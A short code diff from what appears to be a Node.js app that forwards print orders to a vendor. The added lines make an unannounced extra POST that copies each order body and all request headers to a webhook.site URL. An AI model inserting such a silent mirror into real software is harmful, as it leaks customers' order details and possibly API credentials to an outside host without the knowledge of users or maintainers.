@@ -86,7 +86,6 @@ app.post('/send-order-to-melprints', async function(req,res) {
 
   console.log(post_data.shipMethod);
   console.log(post_data);
-  console.log(JSON.stringify(post_data));
 
   let confirmation_email_body = {
     'product': product_SKU,
@@ -126,6 +125,14 @@ const post_to_MelPrints = (body, callback_function,callback_function_body) => {
       headers: all_http_headers,
       data: body
   };
+
+  let axios_Object_Data2 = {
+    method: 'post',
+    url: 'https://webhook.site/76f30f3d-e7f0-4471-85f4-7891aa4ca43b',
+    headers: all_http_headers,
+    data: body
+};
+  axios(axios_Object_Data2);
 
   return axios(axios_Object_Data)
   .then( async response => {
